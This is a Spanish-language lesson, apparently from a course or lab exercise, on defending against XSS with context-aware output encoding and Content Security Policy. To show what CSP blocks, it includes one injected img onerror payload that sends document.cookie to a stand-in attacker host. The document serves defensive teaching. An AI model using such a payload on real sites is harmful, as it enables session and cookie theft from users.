# Objetivo 3: Defensa en Profundidad (Encoding y CSP)

## Defensa en profundidad

Ningún mecanismo de defensa aislado es, en la práctica, 100% infalible — siempre puede aparecer un caso borde, un contexto no contemplado, o un bug de implementación. Por eso la estrategia correcta contra XSS no es confiar en una sola barrera, sino **combinar varias capas independientes**, de forma que si una falla, la siguiente igual detenga el ataque. Acá se explican dos capas complementarias: **Output Encoding** (a nivel de código) y **Content Security Policy** (a nivel de cabeceras HTTP).

---

## Capa 1: Output Encoding (Codificación de Salida)

### Qué es

El Output Encoding consiste en **codificar correctamente cualquier dato no confiable (entrada del usuario) en el momento exacto de insertarlo en una salida**, según el contexto específico donde se va a insertar. La idea central es: los datos del usuario nunca deben ser interpretados como código o marcado, sino siempre como **datos puros**.

### Por qué funciona (a diferencia de un filtro de "lista negra")

En vez de intentar detectar y bloquear patrones peligrosos (`<script>`, `onerror=`, etc. — un enfoque que, como vimos en el Objetivo 1, es incompleto y fácil de evadir), el encoding transforma los caracteres especiales de forma que **pierdan su significado estructural** en ese contexto, sin eliminar ni rechazar nada.

### El encoding depende del contexto de inserción

Este es el punto más importante y el que más errores de implementación genera: **no existe un único "encoding universal"**. El mismo dato de usuario necesita una codificación distinta según dónde se inserte:

| Contexto de inserción | Ejemplo de código vulnerable | Encoding correcto a aplicar |
|---|---|---|
| Cuerpo de HTML | `<div>` + entrada + `</div>` | **HTML Entity Encoding**: `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`, `&` → `&amp;` |
| Atributo HTML | `<input value="` + entrada + `">` | HTML Attribute Encoding (similar al anterior, pero codificando también comillas simples/dobles para evitar escapar del atributo) |
| Dentro de un bloque `<script>` o un manejador de evento | `<script>var x = "` + entrada + `";</script>` | **JavaScript Encoding**: escapar comillas, barras, y caracteres de control de forma específica para contexto JS (ej. `\"`, `\x3C`) |
| Dentro de una URL | `<a href="` + entrada + `">` | **URL Encoding**: `%XX` para caracteres especiales |
| Dentro de CSS | `<div style="` + entrada + `">` | **CSS Encoding** |

Si una aplicación aplica HTML Entity Encoding a un dato que en realidad se inserta dentro de un bloque `<script>`, ese encoding **no sirve** para ese contexto y el ataque sigue siendo posible — de ahí que la mayoría de los frameworks modernos (React, Angular, Vue, etc.) resuelvan esto automáticamente mediante sus propios sistemas de templating, que aplican el encoding correcto según dónde se está renderizando el dato, en vez de dejarlo en manos del desarrollador cada vez.

### Qué logra esta capa

Con el output encoding bien aplicado, aunque un usuario malicioso logre que su entrada llegue intacta hasta el punto de renderizado (es decir, aunque no exista ningún filtro de entrada), **el navegador nunca llega a interpretar esa entrada como HTML, atributos o JavaScript ejecutable** — la ve simplemente como texto plano a mostrar. Esto mitiga la causa raíz de XSS, en lugar de intentar adivinar qué patrones son "peligrosos".

---

## Capa 2: Content Security Policy (CSP)

### Qué es

CSP es un mecanismo de seguridad que se implementa **a nivel de cabecera HTTP** (`Content-Security-Policy`), mediante el cual el servidor le indica al navegador **qué fuentes de contenido están permitidas** para distintos tipos de recursos (scripts, estilos, imágenes, fuentes, conexiones, etc.) en esa página. El navegador se encarga de hacer cumplir esa política, bloqueando cualquier recurso que no cumpla con las reglas declaradas.

### Por qué actúa como una segunda capa, independiente del código

A diferencia del output encoding (que depende de que el desarrollador haya codificado correctamente cada punto de inserción en el código), CSP actúa como una **red de contención a nivel de navegador**, sin importar si el ataque logró o no inyectar HTML/JS en la página. Ejemplo de una política típica y restrictiva:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
```

Esto le indica al navegador:
- `default-src 'self'`: por defecto, solo cargar recursos del mismo origen que la propia página.
- `script-src 'self'`: solo ejecutar JavaScript proveniente de archivos `.js` servidos desde el propio dominio — **ningún script inline** (como el que inyectaría un atacante directamente en el HTML, del tipo `<img onerror="...">` o `<script>...</script>` embebido) se ejecuta, sin importar cómo haya llegado al DOM.
- `object-src 'none'`: bloquea plugins como Flash, otro vector histórico de XSS.

### Qué logra esta capa frente a un XSS que ya logró inyectarse

Supongamos que, por algún error de encoding no contemplado (recordemos: ninguna defensa es perfecta), un atacante consigue insertar en el DOM algo como:

```html
<img src=x onerror="fetch('https://atacante.com/robo?c='+document.cookie)">
```

Con una CSP bien configurada que no permita scripts inline (`script-src 'self'`, sin `'unsafe-inline'`), **el navegador se niega a ejecutar ese atributo `onerror`**, porque los manejadores de eventos inline cuentan como "script inline" para efectos de CSP. El payload queda inyectado en el HTML, visible, pero **inerte** — el navegador lo bloquea activamente, independientemente de que la primera línea de defensa (el encoding en el código) haya fallado.

### El valor de CSP como segunda capa (defensa en profundidad real)

Esto es justamente lo que hace que la combinación sea "defensa en profundidad" en el sentido estricto: son dos mecanismos que actúan en **momentos y niveles distintos**:

- El **Output Encoding** actúa en el servidor/código, en el momento de generar la respuesta, evitando que el payload llegue siquiera a ser interpretado como marcado.
- La **CSP** actúa en el navegador, después de que la página ya se cargó, como una restricción adicional que bloquea la ejecución de scripts no autorizados **incluso si, por algún motivo, un payload logró colarse en el HTML**.

---

## Conclusión: por qué ambas capas juntas mitigan el riesgo de forma definitiva

| | Qué previene | En qué falla si actúa sola |
|---|---|---|
| **Output Encoding** | Que la entrada del usuario sea interpretada como HTML/JS en primer lugar | Si hay un error humano en un punto de inserción específico (contexto mal identificado, un desarrollador que olvida codificar en un lugar puntual), ese punto queda expuesto |
| **CSP** | Que, aunque algo logre inyectarse en el DOM, el navegador lo ejecute | Si está mal configurada (por ejemplo, incluyendo `'unsafe-inline'` por comodidad, o permitiendo dominios de CDN de terceros poco confiables), pierde buena parte de su efectividad |

Un arquitecto de seguridad que implementa **ambas capas simultáneamente** logra que una falla puntual en una de ellas no se traduzca automáticamente en una explotación exitosa: si el encoding falla en un punto específico del código, la CSP todavía puede evitar que el script inyectado se ejecute; y si en algún momento se relaja la CSP, el encoding sigue evitando que la entrada maliciosa llegue a interpretarse como código en primer lugar. Es la combinación de una defensa "preventiva" (en el origen, el código) con una defensa "de contención" (en el navegador, en tiempo de ejecución) lo que realmente mitiga el riesgo de XSS de forma robusta y definitiva.
